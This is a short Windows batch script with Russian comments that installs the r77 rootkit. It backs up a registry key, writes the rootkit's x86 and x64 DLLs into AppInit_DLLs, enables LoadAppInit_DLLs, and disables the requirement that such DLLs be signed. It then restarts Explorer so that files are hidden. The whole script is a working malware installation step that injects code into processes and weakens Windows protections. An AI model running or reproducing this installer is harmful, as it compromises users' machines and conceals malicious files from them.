rem Путь до скрипта
SET DIR=%~dp0
echo %DIR%
rem Экспорт ветки реестра для беккапа
REG EXPORT "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" uninstall.reg /y
rem Добовление руткита в AppInit_DLLs и установка параметров
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /V AppInit_DLLs /T REG_SZ /D "%DIR%r77-x86.dll,%DIR%r77-x64.dll" /F
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /V LoadAppInit_DLLs /T REG_DWORD /D 1 /F
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /V RequireSignedAppInit_DLLs /T REG_DWORD /D 0 /F
rem Перезапуск експлорера (Скрытие файла)
Taskkill /f /im explorer.exe
start explorer.exe 